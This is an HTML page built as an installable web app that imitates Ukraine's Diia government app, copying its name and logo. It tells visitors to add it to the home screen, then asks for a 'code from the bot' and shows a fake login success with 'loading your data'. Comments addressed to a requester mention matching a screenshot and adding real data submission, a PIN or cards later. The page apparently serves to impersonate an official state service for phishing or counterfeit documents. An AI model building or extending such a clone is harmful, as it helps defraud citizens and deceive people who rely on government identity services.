<!DOCTYPE html>
<html lang="uk">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
  <meta name="theme-color" content="#000000">
  <title>Дія</title>

  <!-- PWA manifest -->
  <link rel="manifest" href="/manifest.json">

  <!-- Іконки (завантаж їх у img/icons/) -->
  <link rel="icon" type="image/png" sizes="192x192" href="/img/icons/icon-192.png">
  <link rel="apple-touch-icon" sizes="192x192" href="/img/icons/icon-192.png">

  <style>
    body {
      margin: 0;
      font-family: Arial, Helvetica, sans-serif;
      background: #f5f5f5;
      color: #000;
      min-height: 100vh;
      overflow-x: hidden;
    }

    #instruction {
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      text-align: center;
      padding: 20px;
    }

    #instruction h1 {
      font-size: 3.8rem;
      font-weight: bold;
      margin-bottom: 40px;
    }

    #instruction p {
      font-size: 1.6rem;
      margin: 16px 0;
      line-height: 1.4;
    }

    #instruction ol {
      list-style: none;
      padding: 0;
      margin: 40px 0;
    }

    #instruction li {
      font-size: 1.5rem;
      margin: 20px 0;
      max-width: 500px;
    }

    /* Екран після установки */
    #app {
      display: none;
      min-height: 100vh;
      background: #f8f9fa;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      padding: 30px 20px;
    }

    .logo {
      width: 140px;
      margin-bottom: 50px;
    }

    h1 {
      font-size: 3.5rem;
      font-weight: bold;
      margin-bottom: 20px;
    }

    .subtitle {
      font-size: 1.6rem;
      color: #555;
      text-align: center;
      margin-bottom: 50px;
    }

    .card {
      width: 100%;
      max-width: 420px;
      background: white;
      border-radius: 24px;
      box-shadow: 0 10px 40px rgba(0,0,0,0.12);
      padding: 50px 35px;
      margin-bottom: 40px;
    }

    input {
      width: 100%;
      padding: 20px;
      font-size: 1.9rem;
      text-align: center;
      border: 2px solid #ddd;
      border-radius: 16px;
      margin-bottom: 30px;
      transition: border-color 0.3s;
    }

    input:focus {
      outline: none;
      border-color: #0066ff;
    }

    button {
      width: 100%;
      padding: 20px;
      font-size: 1.6rem;
      font-weight: bold;
      background: #0066ff;
      color: white;
      border: none;
      border-radius: 16px;
      cursor: pointer;
      transition: background 0.3s, transform 0.2s;
    }

    button:hover {
      background: #0055cc;
      transform: scale(1.02);
    }

    #result {
      margin-top: 30px;
      font-size: 1.4rem;
      text-align: center;
      min-height: 60px;
    }
  </style>
</head>
<body>

  <!-- Екран інструкції (точно як на твоєму скріншоті) -->
  <div id="instruction">
    <h1>Chrome</h1>
    <ol>
      <li>натисніть на три точки в правому верхньому куті</li>
      <li>натисніть на "Додати на головний екран"</li>
    </ol>
  </div>

  <!-- Екран після установки (поле коду) -->
  <div id="app">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7d/Diia_logo.svg/512px-Diia_logo.svg.png" alt="Дія" class="logo">
    <h1>Дія</h1>
    <p class="subtitle">Введіть код від бота</p>
    
    <div class="card">
      <input type="text" id="codeInput" placeholder="Наприклад: ABC123" autofocus>
      <button onclick="skipToNext()">УВІЙТИ</button>
    </div>
    
    <p id="result"></p>
  </div>

  <script>
    // Перевірка standalone-режиму
    function checkStandalone() {
      if (window.matchMedia('(display-mode: standalone)').matches || 
          window.navigator.standalone === true) {
        document.getElementById('instruction').style.display = 'none';
        document.getElementById('app').style.display = 'flex';
        document.getElementById('codeInput').focus();
      }
    }
    checkStandalone();

    // Просто пропускає (як ти просив) — можна замінити на реальний fetch пізніше
    function skipToNext() {
      const result = document.getElementById('result');
      result.innerHTML = 'Перевірка...';
      result.style.color = '#0066ff';

      // Імітація — через 1.5 секунди просто показуємо "успіх"
      setTimeout(() => {
        result.innerHTML = 'Успіх!<br>Завантажуємо ваші дані...';
        result.style.color = '#34c759';
        // Тут пізніше можна додати PIN або картки
      }, 1500);
    }

    // Пропуск по Enter
    document.getElementById('codeInput').addEventListener('keypress', (e) => {
      if (e.key === 'Enter') skipToNext();
    });
  </script>
</body>
</html>
